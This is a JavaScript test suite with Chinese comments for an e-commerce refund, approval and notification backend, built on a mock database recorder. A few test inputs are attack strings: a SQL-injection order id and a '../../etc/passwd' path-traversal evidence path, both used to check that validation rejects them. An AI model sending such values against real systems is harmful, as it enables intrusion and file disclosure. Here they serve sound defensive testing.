      is(col, val) { (entry.is ??= {})[col] = val; return link },
      neq(col, val) { (entry.neq ??= {})[col] = val; return link },
      gt(col, val) { (entry.gt ??= {})[col] = val; return link },
      not(col, op, val) { (entry.not ??= []).push({ col, op, val }); return link },
      // §12.3 的两段时间筛选：四个边界各自独立，测试要能分别看到订单管理接口把哪个列夹在了
      // 哪两个值之间。记成 map 而不是数组，因为同一列不会有两个同向边界。
      gte(col, val) { (entry.gte ??= {})[col] = val; return link },
      lte(col, val) { (entry.lte ??= {})[col] = val; return link },
      // range 是分页的落点。offset 算错在界面上表现为「第二页少一条」，是那种要有人数一遍才会
      // 发现的错，所以两个端点都记下来。
      range(from, to) { entry.range = { from, to }; return link },
      // 求值放在这里而不是上面：函数式给法要读 entry.filters，而那是 .eq() 之后才填好的。
      single: async () => resolveResult(),
      maybeSingle: async () => resolveResult(),
      then: (resolve, reject) => Promise.resolve(resolveResult()).then(resolve, reject)
    }
    return {
      insert(payload) { entry.op = 'insert'; entry.payload = payload; return link },
      update(payload) { entry.op = 'update'; entry.payload = payload; return link },
      // upsert 的第二个参数要记下来：收件箱靠 onConflict 走主键冲突更新，漏掉它会变成重复插入
      // 然后撞主键，而那是只有在「第二次读同一条通知」时才出现的错。
      upsert(payload, opts) { entry.op = 'upsert'; entry.payload = payload; entry.upsertOpts = opts; return link },
      // delete 要记：下单时券抢不到名额会把刚建的订单删掉，而那次删除必须带 status='pending'
      // 的条件——漏掉它就是一个能删掉已支付订单的调用。
      delete() { entry.op = 'delete'; return link },
      // 第二个参数要记：订单列表靠 { count: 'exact' } 拿总数，漏掉它 total 会退化成「本页条数」，
      // 于是分页控件只画出一页，而后面还有几千条订单。
      select(cols, opts) { entry.op = 'select'; entry.selected = cols; entry.selectOpts = opts; return link }
    }
  }
  // 券的核销和退回都走存储过程。记下函数名和参数：redeem_coupon 的 p_discount 传错就是收错钱，
  // 而那笔账在 coupon_redemptions 里看起来完全正常。
  rec.rpcs = []
  rec.rpc = async (fn, params) => {
    rec.rpcs.push({ fn, params })
    const slot = results[`rpc:${fn}`]
    if (typeof slot === 'function') return slot(params) ?? { data: null, error: null }
    if (Array.isArray(slot)) return (slot.length > 1 ? slot.shift() : slot[0]) ?? { data: null, error: null }
    return slot ?? { data: true, error: null }
  }
  // §4.5 附件的大小要问真实的对象元信息，不能信客户端报的 size——文件直接从浏览器传进桶里，
  // 那个数字从来没经过函数。所以 verifyAttachments 会回来问 storage，而这里得能作答。
  // 结果的给法和上面的表一致（对象 / 数组 / 函数），键是 `storage:<bucket>`。
  rec.storageCalls = []
  rec.storage = {
    from(bucket) {
      const slot = results[`storage:${bucket}`]
      const answer = entry => {
        if (typeof slot === 'function') return slot(entry) ?? { data: [], error: null }
        if (Array.isArray(slot)) return (slot.length > 1 ? slot.shift() : slot[0]) ?? { data: [], error: null }
        return slot ?? { data: [], error: null }
      }
      return {
        async list(dir, opts) {
          const entry = { bucket, op: 'list', dir, opts }
          rec.storageCalls.push(entry)
          return answer(entry)
        },
        // remove 要记：超限的对象必须被删掉，否则一个 100MB 的视频靠「发一条会被拒的消息」
        // 就永久留在了桶里，而没有任何一条消息引用它，也就没有人会去清。
        async remove(paths) {
          const entry = { bucket, op: 'remove', paths }
          rec.storageCalls.push(entry)
          return { data: null, error: results[`storage:${bucket}:remove`]?.error ?? null }
        },
        async createSignedUrl(path, ttl) {
          rec.storageCalls.push({ bucket, op: 'sign', path, ttl })
          return { data: { signedUrl: `https://example.test/${path}` }, error: null }
        }
      }
    }
  }
  return rec
}
const lastCall = rec => rec.calls[rec.calls.length - 1]

// 站内信要先过校验再落库，因为数据库的 check 只能报出约束名。
const NOTIF_ROW = { id: 'n1', kind: 'system', scope: 'all', title: '标题', body: '正文' }
let ndb = recorder({ notifications: { data: NOTIF_ROW, error: null } })
const inserted = await insertNotification(ndb, { kind: 'system', scope: 'all', title: '标题', body: '正文' })
assert(inserted.id === 'n1', '插入后返回落库的行')
assert(lastCall(ndb).table === 'notifications' && lastCall(ndb).op === 'insert', '写 notifications 表')
let notifyThrew = ''
try { await insertNotification(recorder(), { kind: 'nope', scope: 'all', title: 't', body: 'b' }) }
catch (e) { notifyThrew = e.message }
assert(notifyThrew.includes('站内信不合法'), '不合法的站内信在打库之前就被拒')
assert(recorder().calls.length === 0, '被拒的站内信不该产生任何数据库调用')
// 站内信的写入失败必须抛。§10.3 的审批通知就是审批流程本身的载体，静默失败等于审批请求没发出去。
notifyThrew = ''
try { await insertNotification(recorder({ notifications: { data: null, error: { message: 'boom' } } }), NOTIF_ROW) }
catch (e) { notifyThrew = e.message }
assert(notifyThrew.includes('站内信写入失败'), '站内信写入失败必须抛，不能吞')

// 反过来，三个日志函数的失败必须被吞掉。一次成功的退款因为审计超时而回「失败」，用户会重试，
// 而重试可能真的退第二次。
//
// 下面几条断言会让 notify.mjs 往 stderr 打四行「写入失败」——那是被测行为本身（吞掉错误但留下
// 痕迹），不是测试出了问题。真正的失败会让整个套件以非零退出，而不是打一行日志。
const failing = table => recorder({ [table]: { data: null, error: { message: 'boom' } } })
assert(await logOrderStatus(failing('order_status_log'), { order_id: 'o1', from_status: 'paid', to_status: 'refund_pending' }) === false,
  '订单日志写失败返回 false 而不抛')
assert(await logRefundAction(failing('refund_audit_log'), { refund_id: 'r1', action: 'approve' }) === false,
  '退款审计写失败返回 false 而不抛')
assert(await logSessionEvent(failing('cs_session_events'), { session_id: 's1', kind: 'open' }) === false,
  '会话事件写失败返回 false 而不抛')

// 日志行的形状：缺省字段要落成空串/null，不能是 undefined——undefined 会被 PostgREST 丢掉，
// 于是 not null 的列用上默认值，而 source 的默认值未必是这次操作的真实来源。
ndb = recorder()
await logOrderStatus(ndb, { order_id: 'o1', from_status: 'paid', to_status: 'refund_pending', actor_group: 'admin', source: 'cs' })
let row = lastCall(ndb).payload
assert(row.actor_id === null && row.note === '', '缺省字段落成 null/空串')
assert(row.source === 'cs', 'source 必须原样带过去——同一个迁移有三个入口，责任归属不同')
assert(Object.values(row).every(v => v !== undefined), '任何字段都不能是 undefined')
ndb = recorder()
await logOrderStatus(ndb, { order_id: 'o1', from_status: 'paid', to_status: 'paid' })
assert(lastCall(ndb).payload.source === 'system', '没给 source 时落到 system')

// §10.2：改金额不改状态，但必须留痕，所以 from/to 允许为空而 amount_minor 要带上。
ndb = recorder()
await logRefundAction(ndb, { refund_id: 'r1', action: 'edit_amount', amount_minor: 5000, actor_group: 'cs' })
row = lastCall(ndb).payload
assert(row.from_status === '' && row.to_status === '', '改金额这类动作不改状态')
assert(row.amount_minor === 5000, '改后的金额必须进审计')
ndb = recorder()
await logRefundAction(ndb, { refund_id: 'r1', action: 'approve' })
assert(lastCall(ndb).payload.amount_minor === null, '没有金额时落 null 而不是 undefined')

// detail 必须是对象。传字符串进来会让 jsonb 列收到一个 JSON 字符串标量，之后统计查询取不到字段。
ndb = recorder()
await logSessionEvent(ndb, { session_id: 's1', kind: 'mode', detail: 'oops' })
assert(typeof lastCall(ndb).payload.detail === 'object', '非对象的 detail 落成空对象')

// settleApproval：并发保护全在过滤条件上。
ndb = recorder({ notifications: { data: [{ id: 'n1' }], error: null } })
const settled = await settleApproval(ndb, 'r1', 'approved', 'admin1')
assert(settled === 1, '真正做了决定的那次返回 1')
const upd = ndb.calls.find(c => c.table === 'notifications')
assert(upd.filters.refund_id === 'r1', '只动这条退款的通知')
assert(upd.filters.kind === 'refund_approval', '只动审批类通知，普通退款告知不该被改')
assert(upd.filters.state === 'pending', '只动还没被处理的——少了这条，第二个管理员也会以为自己做了决定')
assert(upd.payload.pinned === false && upd.payload.highlighted === false,
  '处理完要收掉置顶高亮，否则置顶位不再有意义')
assert(upd.payload.state === 'approved', '结果留在通知上')
assert(!('id' in upd.payload), '不能改通知的 id')
// 第二个管理员：影响 0 行，且不写审计——他没做决定。
ndb = recorder({ notifications: { data: [], error: null } })
assert(await settleApproval(ndb, 'r1', 'rejected', 'admin2') === 0, '慢的那次返回 0')
assert(!ndb.tables.includes('refund_audit_log'), '没做决定就不该留下一条决定的审计')
notifyThrew = ''
try { await settleApproval(recorder({ notifications: { data: null, error: { message: 'boom' } } }), 'r1', 'approved', 'a1') }
catch (e) { notifyThrew = e.message }
assert(notifyThrew.includes('审批状态回写失败'), '审批回写失败必须抛——它是审批流程的一部分')

// notifyUser 走 scope='user'，所以必须带 recipient_id，否则 schema 那条 check 会拒。
ndb = recorder({ notifications: { data: NOTIF_ROW, error: null } })
await notifyUser(ndb, 'u1', { title: '退款已完成', body: '款项已退回' })
row = lastCall(ndb).payload
assert(row.scope === 'user' && row.recipient_id === 'u1', 'scope 和 recipient_id 必须同时在')
assert(row.state === null, '给用户的告知不是待办事项，state 必须是 null 而不是 pending')

// setting()：缺键要给 fallback，不能让调用方各自猜默认值。
assert(await setting(recorder({ site_settings: { data: null, error: null } }), 'nope', 48) === 48, '缺键返回 fallback')
assert(await setting(recorder({ site_settings: { data: { value: { value: 24 } }, error: null } }), 'k', 48) === 24, '取 value.value')
assert(await setting(recorder({ site_settings: { data: { value: { value: false } }, error: null } }), 'k', true) === false,
  'false 是有效值，不能被当成缺失而落到 fallback')
assert(await setting(recorder({ site_settings: { data: { value: { value: 0 } }, error: null } }), 'k', 30) === 0,
  '0 同理——audit_log_retention_days 的 0 表示永久保留')
assert(await setting(recorder({ site_settings: { data: null, error: { message: 'boom' } } }), 'k', 48) === 48, '读失败也给 fallback')

console.log('Notification and audit writes: OK')

// --- §10.2 / §13.3 发起退款 ------------------------------------------------------------------------
// 这个接口跑在 service client 上，所以「谁的订单」「金额上限」「只允许一条在途」三件事全靠这里的
// 代码，没有 RLS 兜底。下面按这三条各钉一遍。
const BUYER = '33333333-3333-4333-8333-333333333333'
const AGENT = '44444444-4444-4444-8444-444444444444'
const RORDER = '55555555-5555-4555-8555-555555555555'
// 真 uuid 而不是 'r1'：审批通知的按钮 target 要过 uuid 校验，假数据得和真实的 refund.id 同形，
// 否则测试会在一个真实环境里不存在的地方失败。
const REFUND = '66666666-6666-4666-8666-666666666666'
const paidRow = {
  id: RORDER, user_id: BUYER, status: 'paid',
  amount_minor: 10000, paid_amount_minor: 9500, currency: 'USD', paid_currency: 'USD'
}
// 一个能跑通全程的 db：查订单 → 查在途申请（无）→ 插入 → 写审计 → 插通知。
const refundDb = (order = paidRow, existing = null, insert = { data: { id: REFUND }, error: null }) => recorder({
  orders: { data: order, error: null },
  refund_requests: [{ data: existing, error: null }, insert],
  notifications: { data: { id: 'n1' }, error: null }
})

let rdb = refundDb()
let out = await requestRefund(rdb, { userId: BUYER, group: 'default' }, {
  order_id: RORDER, reason_code: 'not_working', reason_detail: '装不上'
})
assert(out.status === 201, '用户给自己的已支付订单提退款应成功')
assert(out.body.notified === true, '审批通知发出去了')
let ins = rdb.calls.find(c => c.table === 'refund_requests' && c.op === 'insert').payload
assert(ins.status === 'pending', '新申请落在待审批')
assert(ins.initiator_role === 'user', '用户自己提的记成 user')
assert(ins.user_id === BUYER, 'user_id 记订单的主人，不是发起人——代提时这两者不同')
assert(ins.amount_minor === 9500, '没给金额时取实付金额，不是下单金额')
assert(ins.currency === 'USD', '币种跟实付走')
// 订单状态不能在这里被改。§13.3 规定审批通过才进 REFUND_PENDING。
assert(!rdb.calls.some(c => c.table === 'orders' && c.op === 'update'), '提交申请不改订单状态')
assert(!rdb.tables.includes('order_status_log'), '没有状态变更就不该写状态日志，否则 §12.4 里出现假条目')
assert(rdb.tables.includes('refund_audit_log'), '申请本身的痕迹要进审计')

// §10.2：原因必填。
for (const detail of ['', '   ', undefined, null]) {
  const answer = await requestRefund(refundDb(), { userId: BUYER, group: 'default' },
    { order_id: RORDER, reason_detail: detail })
  assert(answer.status === 400 && answer.body.error.includes('原因'), `空原因（${JSON.stringify(detail)}）应拒`)
}
// 订单号格式不对要答 400 而不是 500，同 cancel-order 的处理。
for (const badId of ['', null, 'not-a-uuid', "' or 1=1--", `${RORDER}x`]) {
  const answer = await requestRefund(refundDb(), { userId: BUYER, group: 'default' },
    { order_id: badId, reason_detail: '理由' })
  assert(answer.status === 400, `订单号 ${JSON.stringify(badId)} 应答 400`)
}

// 别人的订单：普通用户要拿到和「订单不存在」一模一样的答复，否则这就是个订单号探测接口。
const otherAnswer = await requestRefund(refundDb(), { userId: AGENT, group: 'default' },
  { order_id: RORDER, reason_detail: '理由' })
const missingAnswer = await requestRefund(refundDb(null), { userId: BUYER, group: 'default' },
  { order_id: RORDER, reason_detail: '理由' })
assert(otherAnswer.status === missingAnswer.status && otherAnswer.body.error === missingAnswer.body.error,
  '别人的订单和不存在的订单必须给同一个答复')
assert(otherAnswer.status === 404, '两者都是 404')

// §10.7：代提。售前不在名单里，尽管 rank 和售后相同。
for (const group of ['postsale', 'cs', 'admin']) {
  const answer = await requestRefund(refundDb(), { userId: AGENT, group }, { order_id: RORDER, reason_detail: '客诉' })
  assert(answer.status === 201, `${group} 可以代提`)
}
for (const group of ['presale', 'coworker', 'read', 'default']) {
  const answer = await requestRefund(refundDb(), { userId: AGENT, group }, { order_id: RORDER, reason_detail: '客诉' })
  assert(answer.status === 404, `${group} 不能代提别人的订单`)
}
rdb = refundDb()
await requestRefund(rdb, { userId: AGENT, group: 'cs' }, { order_id: RORDER, reason_detail: '客诉' })
ins = rdb.calls.find(c => c.table === 'refund_requests' && c.op === 'insert').payload
assert(ins.initiator_role === 'cs' && ins.initiated_by === AGENT, '代提要记下是谁以什么身份提的')
assert(ins.user_id === BUYER, '代提时 user_id 仍是订单主人')

// §10.2 的金额上限。这条是整个接口里最贵的一条：过不了就是能退出比实付更多的钱。
const overAnswer = await requestRefund(refundDb(), { userId: AGENT, group: 'cs' },
  { order_id: RORDER, reason_detail: '理由', amount_minor: 9501 })
assert(overAnswer.status === 400 && overAnswer.body.error.includes('不得超过实付'), '超过实付金额必须拒')
// 上限是实付而不是下单金额——用了券的订单这两者不同，按下单金额退就是白送折扣那部分。
assert(paidRow.amount_minor > paidRow.paid_amount_minor, '这个用例的订单用过券，两个金额不同')
const listAnswer = await requestRefund(refundDb(), { userId: AGENT, group: 'cs' },
  { order_id: RORDER, reason_detail: '理由', amount_minor: 10000 })
assert(listAnswer.status === 400, '按下单金额退款必须被拒——差额就是券的折扣')
for (const amount of [0, -1, 95.5, '9500', NaN]) {
  const answer = await requestRefund(refundDb(), { userId: AGENT, group: 'cs' },
    { order_id: RORDER, reason_detail: '理由', amount_minor: amount })
  assert(answer.status === 400, `金额 ${JSON.stringify(amount)} 应拒`)
}
rdb = refundDb()
out = await requestRefund(rdb, { userId: AGENT, group: 'cs' },
  { order_id: RORDER, reason_detail: '只退一半', amount_minor: 4750 })
assert(out.status === 201, '合法的部分退款可以提')
assert(rdb.calls.find(c => c.table === 'refund_requests' && c.op === 'insert').payload.amount_minor === 4750, '部分金额落库')

// 用户不能自己挑金额，且必须是明确拒绝而不是静默忽略——静默忽略会让用户以为部分退款提上去了。
const userAmount = await requestRefund(refundDb(), { userId: BUYER, group: 'default' },
  { order_id: RORDER, reason_detail: '理由', amount_minor: 100 })
assert(userAmount.status === 403 && userAmount.body.error.includes('客服'), '用户指定金额要被明确拒绝')

// §14 的 refund_cs_can_edit_amount 开关：关掉时客服不能改，管理员不受影响。
const noEdit = table => recorder({
  orders: { data: paidRow, error: null },
  refund_requests: [{ data: null, error: null }, { data: { id: REFUND }, error: null }],
  notifications: { data: { id: 'n1' }, error: null },
  site_settings: { data: { value: { value: false } }, error: null }
})
const csBlocked = await requestRefund(noEdit(), { userId: AGENT, group: 'cs' },
  { order_id: RORDER, reason_detail: '理由', amount_minor: 4000 })
assert(csBlocked.status === 403 && csBlocked.body.error.includes('不允许客服修改'), '开关关掉时客服不能改金额')
const adminAllowed = await requestRefund(noEdit(), { userId: AGENT, group: 'admin' },
  { order_id: RORDER, reason_detail: '理由', amount_minor: 4000 })
assert(adminAllowed.status === 201, '那个开关的字面意思是「客服是否可改」，管理员不受约束')
// 开关只在真要改金额时才读——不改金额的申请不该被一个无关开关挡住。
const untouched = noEdit()
await requestRefund(untouched, { userId: AGENT, group: 'cs' }, { order_id: RORDER, reason_detail: '理由' })
assert(!untouched.tables.includes('site_settings'), '不改金额时不必读那个开关')

// §13.2 的不可退状态。
for (const status of ['pending', 'failed', 'cancelled', 'refund_pending', 'refunded']) {
  const answer = await requestRefund(refundDb({ ...paidRow, status }), { userId: BUYER, group: 'default' },
    { order_id: RORDER, reason_detail: '理由' })
  assert(answer.status === 409, `${status} 的订单不能提退款`)
  assert(answer.body.error.length > 0, `${status} 要给出说明——§13.2 的悬浮文案就是这句`)
}

// 在途申请要拦住第二次提交。申请提交时订单还是 paid，所以光看订单状态查不出来。
for (const status of ['pending', 'approved', 'transferred', 'executing']) {
  const answer = await requestRefund(refundDb(paidRow, { id: 'r0', status }), { userId: BUYER, group: 'default' },
    { order_id: RORDER, reason_detail: '理由' })
  assert(answer.status === 409, `已有${status}的申请时不能再提`)
}
for (const status of ['rejected', 'completed']) {
  const answer = await requestRefund(refundDb(paidRow, { id: 'r0', status }), { userId: BUYER, group: 'default' },
    { order_id: RORDER, reason_detail: '理由' })
  assert(answer.status === 201, `${status} 的旧申请不该挡住新申请——§10.3 要求拒绝必须填理由，隐含理由被解决后可重提`)
}
// 并发：两个请求同时读到零行、同时插入，只有索引能挡住。23505 要翻译成 409 而不是 500。
const raced = await requestRefund(
  refundDb(paidRow, null, { data: null, error: { code: '23505', message: 'duplicate key' } }),
  { userId: BUYER, group: 'default' }, { order_id: RORDER, reason_detail: '理由' })
assert(raced.status === 409 && raced.body.error.includes('在途'), '唯一约束冲突要答 409')
const insFailed = await requestRefund(
  refundDb(paidRow, null, { data: null, error: { code: 'XX000', message: 'boom' } }),
  { userId: BUYER, group: 'default' }, { order_id: RORDER, reason_detail: '理由' })
assert(insFailed.status === 500, '其他写入错误仍是 500')

// 证据路径只做形状检查——归属由 storage 的 RLS 策略在上传时管。
const tooManyFiles = await requestRefund(refundDb(), { userId: BUYER, group: 'default' },
  { order_id: RORDER, reason_detail: '理由', evidence_paths: Array(11).fill('a/b.png') })
assert(tooManyFiles.status === 400, '证据文件数量要有上限')
const traversal = await requestRefund(refundDb(), { userId: BUYER, group: 'default' },
  { order_id: RORDER, reason_detail: '理由', evidence_paths: ['../../etc/passwd'] })
assert(traversal.status === 400, '带 .. 的路径要拒')
rdb = refundDb()
await requestRefund(rdb, { userId: BUYER, group: 'default' },
  { order_id: RORDER, reason_detail: '理由', evidence_paths: ['a/b.png', '', '  ', 'c/d.png'] })
assert(rdb.calls.find(c => c.table === 'refund_requests' && c.op === 'insert').payload.evidence_paths.length === 2,
  '空路径被过滤掉，不该留下空串')

// §10.3 的审批通知：插不进去时申请仍然算成功，但要如实告知。管理员还能从待审批列表看到。
const notifyBroken = recorder({
  orders: { data: paidRow, error: null },
  refund_requests: [{ data: null, error: null }, { data: { id: REFUND }, error: null }],
  notifications: { data: null, error: { message: 'boom' } }
})
out = await requestRefund(notifyBroken, { userId: BUYER, group: 'default' }, { order_id: RORDER, reason_detail: '理由' })
assert(out.status === 201 && out.body.notified === false, '通知失败不该让已落库的申请回报失败')
// 通知必须是 refund_approval，否则 §9.6 的强制置顶不会生效。
rdb = refundDb()
await requestRefund(rdb, { userId: BUYER, group: 'default' }, { order_id: RORDER, reason_detail: '装不上' })
const notif = rdb.calls.find(c => c.table === 'notifications' && c.op === 'insert').payload
assert(notif.kind === 'refund_approval' && notif.state === 'pending', '审批通知的类型和状态')
assert(notif.scope === 'admin' && notif.recipient_id === null, '发给全体管理员，不是某一个')
assert(notif.actions.length === 3, '三个按钮：批准、拒绝、转交')
assert(notif.body.includes('装不上'), '退款原因要出现在通知正文里，否则审批人得再点一次才能看到')

assert(orderNoOf(RORDER) === '55555555', '订单号取 id 前 8 位')
assert(orderNoOf(null) === '', 'id 缺失时不要渲染出 "null"')

console.log('Refund requests: OK')

// --- §10.3 批准退款 + §13.4 PAID → REFUND_PENDING ---------------------------------------------------
// 这一段的核心是并发：两个管理员同时点不同按钮时，只能有一个人的决定生效。保护全在 update 的
// .eq('status', …) 上，所以下面逐条钉住那些条件，以及「抢不到时不能继续往下写」。
const ADMIN1 = '77777777-7777-4777-8777-777777777777'
const pendingRefund = {
  id: REFUND, order_id: RORDER, user_id: BUYER, status: 'pending',
  amount_minor: 9500, currency: 'USD', reason_detail: '装不上', initiated_by: BUYER, initiator_role: 'user'
}
// 配置按 key 作答：二次确认默认开，自动执行默认关。
const settings = overrides => entry => {
  const key = entry.filters.key
  const table = { refund_require_second_confirm: true, refund_auto_execute: false, ...overrides }
  return { data: key in table ? { value: { value: table[key] } } : null, error: null }
}
const approveDb = (opts = {}) => recorder({
  refund_requests: [
    { data: opts.refund === undefined ? pendingRefund : opts.refund, error: null },
    { data: opts.moved === 0 ? [] : [{ id: REFUND, status: 'approved' }], error: null }
  ],
  orders: [
    { data: opts.order === undefined ? { ...paidRow, status: 'paid' } : opts.order, error: null },
    opts.orderMoveError
      ? { data: null, error: { message: 'boom' } }
      : { data: opts.orderMoved === 0 ? [] : [{ id: RORDER }], error: null }
  ],
  site_settings: settings(opts.settings),
  notifications: { data: [{ id: 'n1' }], error: null }
})

let adb = approveDb()
let ok = await approveRefund(adb, { userId: ADMIN1, group: 'admin' }, { refund_id: REFUND, confirm: true })
assert(ok.status === 200, '管理员批准应成功')
assert(ok.body.status === 'approved' && ok.body.order_status === 'refund_pending', '§13.4 的两个状态')
assert(ok.body.amount_minor === 9500, '没改金额时沿用申请上的金额')
let refundUpd = adb.calls.find(c => c.table === 'refund_requests' && c.op === 'update')
assert(refundUpd.filters.status === 'pending', '申请的 update 必须要求它还在待审批——这是并发保护')
assert(refundUpd.filters.id === REFUND, '只动这一条申请')
assert(refundUpd.payload.decided_by === ADMIN1 && refundUpd.payload.decided_at, '记下是谁什么时候批的')
let orderUpd = adb.calls.find(c => c.table === 'orders' && c.op === 'update')
assert(orderUpd.filters.status === 'paid', '订单的 update 必须要求它还是已支付——§13.1')
assert(orderUpd.payload.status === 'refund_pending', '订单进退款中')
assert(!('paid_amount_minor' in orderUpd.payload) && !('amount_minor' in orderUpd.payload),
  '批准不该动订单金额——那会让实付金额和支付渠道的记录不一致')
// 状态日志要记成 §13.4 要求的那条边。
const statusLog = adb.calls.find(c => c.table === 'order_status_log').payload
assert(statusLog.from_status === 'paid' && statusLog.to_status === 'refund_pending', 'PAID → REFUND_PENDING')
assert(statusLog.source === 'admin', '来源是管理员，不是 system')

// 只有管理员能批。这里用名单而不是 rank，所以逐个组试一遍。
for (const group of ['cs', 'postsale', 'presale', 'coworker', 'read', 'default']) {
  const answer = await approveRefund(approveDb(), { userId: ADMIN1, group }, { refund_id: REFUND, confirm: true })
  assert(answer.status === 403, `${group} 不能批准退款`)
}
// 权限要在读库之前判掉，否则一个无权的人也能靠答复差异问出申请是否存在。
const early = approveDb()
await approveRefund(early, { userId: ADMIN1, group: 'cs' }, { refund_id: REFUND, confirm: true })
assert(early.calls.length === 0, '无权时不该产生任何数据库调用')

// §14 的强制二次确认：开着时缺 confirm 要拒，而且不能已经写过任何东西。
const unconfirmed = approveDb()
const needsConfirmAnswer = await approveRefund(unconfirmed, { userId: ADMIN1, group: 'admin' }, { refund_id: REFUND })
assert(needsConfirmAnswer.status === 428 && needsConfirmAnswer.body.requires_confirm === true, '缺二次确认应拒')
assert(!unconfirmed.calls.some(c => c.op === 'update'), '被二次确认拦下时不能已经改了状态')
for (const bad of [false, 'true', 1, null, undefined]) {
  const answer = await approveRefund(approveDb(), { userId: ADMIN1, group: 'admin' },
    { refund_id: REFUND, confirm: bad })
  assert(answer.status === 428, `confirm=${JSON.stringify(bad)} 不算确认——只有布尔真才算`)
}
// 关掉开关时不需要 confirm。
const noConfirmNeeded = await approveRefund(approveDb({ settings: { refund_require_second_confirm: false } }),
  { userId: ADMIN1, group: 'admin' }, { refund_id: REFUND })
assert(noConfirmNeeded.status === 200, '关掉开关后可以直接批准')

// 申请状态不对：只有待审批和已转交能进已批准（§10.4）。
for (const status of ['approved', 'rejected', 'executing', 'completed', 'failed']) {
  const answer = await approveRefund(approveDb({ refund: { ...pendingRefund, status } }),
    { userId: ADMIN1, group: 'admin' }, { refund_id: REFUND, confirm: true })
  assert(answer.status === 409, `${status} 的申请不能再批准`)
}
const fromTransferred = await approveRefund(
  recorder({
    refund_requests: [{ data: { ...pendingRefund, status: 'transferred' }, error: null },
      { data: [{ id: REFUND }], error: null }],
    orders: [{ data: { ...paidRow, status: 'paid' }, error: null }, { data: [{ id: RORDER }], error: null }],
    site_settings: settings(), notifications: { data: [{ id: 'n1' }], error: null }
  }), { userId: ADMIN1, group: 'admin' }, { refund_id: REFUND, confirm: true })
assert(fromTransferred.status === 200, '转交后的申请可以被接手的人批准')

// 订单状态不对：§13.1 只允许从 PAID 进退款中。
for (const status of ['pending', 'failed', 'cancelled', 'refund_pending', 'refunded']) {
  const answer = await approveRefund(approveDb({ order: { ...paidRow, status } }),
    { userId: ADMIN1, group: 'admin' }, { refund_id: REFUND, confirm: true })
  assert(answer.status === 409, `订单是 ${status} 时不能批准退款`)
}
// 订单状态不对时不能已经把申请改成已批准——那会留下一条永远推不动的申请。
const badOrder = approveDb({ order: { ...paidRow, status: 'refunded' } })
await approveRefund(badOrder, { userId: ADMIN1, group: 'admin' }, { refund_id: REFUND, confirm: true })
assert(!badOrder.calls.some(c => c.table === 'refund_requests' && c.op === 'update'),
  '订单不能迁移时，申请也不该被改动')

// 找不到申请 / 找不到订单 / 申请号格式不对。
const missingRefund = await approveRefund(approveDb({ refund: null }), { userId: ADMIN1, group: 'admin' },
  { refund_id: REFUND, confirm: true })
assert(missingRefund.status === 404, '申请不存在答 404')
const missingOrder = await approveRefund(approveDb({ order: null }), { userId: ADMIN1, group: 'admin' },
  { refund_id: REFUND, confirm: true })
assert(missingOrder.status === 404, '订单不存在答 404')
for (const badId of ['', null, 'nope', `${REFUND}x`]) {
  const answer = await approveRefund(approveDb(), { userId: ADMIN1, group: 'admin' },
    { refund_id: badId, confirm: true })
  assert(answer.status === 400, `申请号 ${JSON.stringify(badId)} 答 400`)
}

// 抢不到申请：另一个管理员先处理了。这时候绝对不能继续往下改订单。
const lost = approveDb({ moved: 0 })
const lostAnswer = await approveRefund(lost, { userId: ADMIN1, group: 'admin' }, { refund_id: REFUND, confirm: true })
assert(lostAnswer.status === 409 && lostAnswer.body.error.includes('其他管理员'), '抢不到时告诉他谁快了一步')
assert(!lost.calls.some(c => c.table === 'orders' && c.op === 'update'),
  '抢不到申请就不能动订单——否则订单进了退款中却没有在途申请能推下去')
assert(!lost.tables.includes('order_status_log'), '也不该留下一条没发生的状态变更')

// 反过来：申请抢到了但订单没动。批准已经生效，所以不能报失败，但要如实说订单没动，并留痕。
const orderStuck = approveDb({ orderMoved: 0 })
const stuckAnswer = await approveRefund(orderStuck, { userId: ADMIN1, group: 'admin' },
  { refund_id: REFUND, confirm: true })
assert(stuckAnswer.status === 200 && stuckAnswer.body.order_moved === false, '订单没动要如实报告')
assert(stuckAnswer.body.order_status === 'paid', '订单状态如实返回原值，不能假报 refund_pending')
assert(!orderStuck.tables.includes('order_status_log'), '没发生的迁移不写状态日志')
// 按 action 断言而不是数条数：数量会随着别处多写一条审计（比如 settleApproval 自己那条）
// 一起变，改一处要跟着改测试；而这里真正要保证的是「订单没动」这件事本身留下了痕迹。
const stuckActions = orderStuck.calls
  .filter(c => c.table === 'refund_audit_log').map(c => c.payload?.action)
assert(stuckActions.includes('approve'), '批准本身要留痕')
assert(stuckActions.includes('order_move_failed'),
  '订单没动要单独留一条审计——否则事后只能看到「批准了」，看不出订单为什么还在 PAID')
const orderBroken = approveDb({ orderMoveError: true })
const brokenAnswer = await approveRefund(orderBroken, { userId: ADMIN1, group: 'admin' },
  { refund_id: REFUND, confirm: true })
assert(brokenAnswer.status === 200 && brokenAnswer.body.order_moved === false, '订单写入报错同样如实报告')

// §10.2：批准时可以改金额，上限仍是实付。
const reduced = approveDb()
const reducedAnswer = await approveRefund(reduced, { userId: ADMIN1, group: 'admin' },
  { refund_id: REFUND, confirm: true, amount_minor: 5000 })
assert(reducedAnswer.body.amount_minor === 5000, '批准时改的金额要生效')
assert(reduced.calls.find(c => c.table === 'refund_requests' && c.op === 'update').payload.amount_minor === 5000,
  '改后的金额要落库，否则执行时按旧金额退')
const overCap = await approveRefund(approveDb(), { userId: ADMIN1, group: 'admin' },
  { refund_id: REFUND, confirm: true, amount_minor: 9501 })
assert(overCap.status === 400, '批准时也不能超过实付金额')

// §9.6：那条审批通知要被收掉置顶。
const settled2 = adb.calls.find(c => c.table === 'notifications' && c.op === 'update')
assert(settled2 && settled2.payload.state === 'approved' && settled2.payload.pinned === false,
  '审批通知要留下结果并停止置顶')
// 通知回写失败不能让批准回滚——批准已经生效了。
const notifBroken = recorder({
  refund_requests: [{ data: pendingRefund, error: null }, { data: [{ id: REFUND }], error: null }],
  orders: [{ data: { ...paidRow, status: 'paid' }, error: null }, { data: [{ id: RORDER }], error: null }],
  site_settings: settings(), notifications: { data: null, error: { message: 'boom' } }
})
const stillOk = await approveRefund(notifBroken, { userId: ADMIN1, group: 'admin' }, { refund_id: REFUND, confirm: true })
assert(stillOk.status === 200, '通知回写失败不影响批准结果')

// §14 的 refund_auto_execute 默认关：§13.4 要求「退款成功」是人手点的。
assert(ok.body.auto_execute === false, '自动执行默认关闭')
const autoOn = await approveRefund(approveDb({ settings: { refund_auto_execute: true } }),
  { userId: ADMIN1, group: 'admin' }, { refund_id: REFUND, confirm: true })
assert(autoOn.body.auto_execute === true, '开关打开时如实告知调用方')

console.log('Refund approval: OK')

// ---------------------------------------------------------------------------
